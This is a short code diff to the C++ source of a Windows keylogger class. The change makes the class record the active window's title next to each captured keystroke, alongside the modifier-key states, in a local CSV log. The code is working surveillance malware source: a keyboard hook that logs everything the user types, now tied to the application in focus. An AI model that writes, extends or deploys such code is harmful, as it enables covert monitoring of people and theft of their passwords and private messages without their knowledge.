@@ -24,7 +24,7 @@ KeyLogger::KeyLogger(std::string logFilePath) {
     logFile.open(logFilePath.c_str(), ios::app);
 
     if(!logCheck.good()) {
-        logFile << "Time, Key, LShift, RShift, Alt, Ctrl" << endl;
+        logFile << "Time, Key, LShift, RShift, Alt, Ctrl, Window" << endl;
     }
 
     logCheck.close();
@@ -110,23 +110,30 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 void KeyLogger::listen() {
+
     MSG message;
     while (GetMessage(&message, NULL, 0, 0)) {
         TranslateMessage(&message);
         DispatchMessage(&message);
     }
-    logFile << "ll";
 }
 
 void KeyLogger::log(DWORD key) {
+
     char message[100];
     GetKeyNameText(key, message, 100);
-    logFile << time(NULL) << ", " << message << ", " << lshiftDown << ", " << rshiftDown << ", " << altDown << ", " << ctrlDown << endl;
+    logFile << time(NULL) << ", " << message << ", " << lshiftDown << ", " << rshiftDown << ", " << altDown << ", " << ctrlDown << ", " << getActiveWindowTitle() << endl;
 }
 
-HHOOK KeyLogger::getHook() {
-    return hook;
+std::string KeyLogger::getActiveWindowTitle() {
+
+    char title[256];
+    HWND hwnd = GetForegroundWindow();
+    GetWindowText(hwnd, title, sizeof(title));
+    return std::string(title);
 }
+
+HHOOK KeyLogger::getHook() { return hook; }
 
 bool KeyLogger::isAltDown() { return altDown; }
 
